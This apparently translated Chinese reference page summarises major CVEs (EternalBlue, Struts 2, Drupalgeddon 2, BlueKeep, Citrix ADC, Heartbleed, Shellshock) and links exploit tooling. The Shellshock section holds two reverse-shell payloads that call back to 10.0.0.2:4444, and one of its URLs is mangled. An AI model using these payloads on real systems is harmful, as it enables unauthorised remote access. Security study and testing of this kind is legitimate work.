# 常见漏洞和暴露

## 工具

- [Trickest CVE 仓库 - 自动收集 CVE 和 PoC](https://github.com/trickest/cve)
- [Nuclei 模板 - 社区策划的 nuclei 引擎用于发现应用程序中安全漏洞的模板列表](https://github.com/projectdiscovery/nuclei-templates)
- [Metasploit 框架](https://github.com/rapid7/metasploit-framework)
- [CVE 详情 - 最终的安全漏洞数据源](https://www.cvedetails.com/)

## 过去 5 年中的重大 CVE

### CVE-2017-0144 - EternalBlue

EternalBlue 利用了微软实现的 Server Message Block（SMB）协议中的一个漏洞。该漏洞存在是因为各种版本的 Microsoft Windows 中的 SMB 版本 1（SMBv1）服务器处理来自远程攻击者的特制数据包不当，允许他们在目标计算机上执行任意代码。

受影响的系统：

- Windows Vista SP2
- Windows Server 2008 SP2 和 R2 SP1
- Windows 7 SP1
- Windows 8.1
- Windows Server 2012 Gold 和 R2
- Windows RT 8.1
- Windows 10 Gold、1511 和 1607
- Windows Server 2016

### CVE-2017-5638 - Apache Struts 2

3月6日，Apache Struts 2 中一个新的远程代码执行（RCE）漏洞被公开。这个最近的漏洞，CVE-2017-5638，允许远程攻击者通过“Content-Type”头向 Web 应用程序注入操作系统命令。

### CVE-2018-7600 - Drupalgeddon 2（Drupal 末日 2）

Drupal 7.x 和 8.x 的多个子系统中存在远程代码执行漏洞。这可能允许攻击者在 Drupal 站点上利用多个攻击向量，可能导致站点被完全攻陷。

### CVE-2019-0708 - BlueKeep（蓝屏保持）

在远程桌面服务（以前称为终端服务）中存在一个远程代码执行漏洞，当未经身份验证的攻击者使用 RDP 连接到目标系统并发送精心构造的请求时，该漏洞就会被利用。这个漏洞是预认证的，不需要用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或以完整用户权限创建新账户。

### CVE-2019-19781 - Citrix ADC Netscaler（思杰 ADC 网锐）

Citrix 应用交付控制器（ADC），以前称为 NetScaler ADC 和 Citrix 网关，以前称为 NetScaler 网关中存在一个远程代码执行漏洞，如果被利用，可能允许未经身份验证的攻击者执行任意代码。

受影响的产品：

- Citrix ADC 和 Citrix 网关版本 13.0 所有支持的构建
- Citrix ADC 和 NetScaler 网关版本 12.1 所有支持的构建
- Citrix ADC 和 NetScaler 网关版本 12.0 所有支持的构建
- Citrix ADC 和 NetScaler 网关版本 11.1 所有支持的构建
- Citrix NetScaler ADC 和 NetScaler 网关版本 10.5 所有支持的构建

## 虽旧但未被遗忘

### CVE-2014-0160 - Heartbleed（心脏滴血）

心脏滴血漏洞是流行的 OpenSSL 加密软件库中的一个严重漏洞。这种弱点允许窃取在正常条件下由 SSL/TLS 加密保护的信息，SSL/TLS 为互联网上的应用程序（如网页、电子邮件、即时通讯（IM）和一些虚拟专用网络（VPNs））提供通信安全和隐私。

### CVE-2014-6271 - Shellshock（贝壳冲击）

Shellshock，也称为 Bashdoor，是在广泛使用的 Unix Bash shell 中发现的一系列安全漏洞，其中第一个于 2014 年 9 月 24 日公开。许多面向互联网的服务，例如某些 Web 服务器部署，使用 Bash 处理某些请求，允许攻击者使易受攻击的 Bash 版本执行任意命令。这可以让攻击者获得对计算机系统的未经授权访问。

```powershell
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 10.0.0.2 4444 -e /bin/sh\r\n"
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.2/4444 0>&1" "[https://10.0.0.1/cgi-bin/admin.cgi"（https://10.0.0.1/cgi-bin/admin.cgi"）](https://10.0.0.1/cgi-bin/admin.cgi%22%EF%BC%88https://10.0.0.1/cgi-bin/admin.cgi%22%EF%BC%89)
```

## 感谢

- 心脏滴血 - 官方网站
- 贝壳冲击 - 维基百科
- Imperva Apache Struts 分析
- 永恒之蓝 - 维基百科
- [蓝屏保持 - 微软]
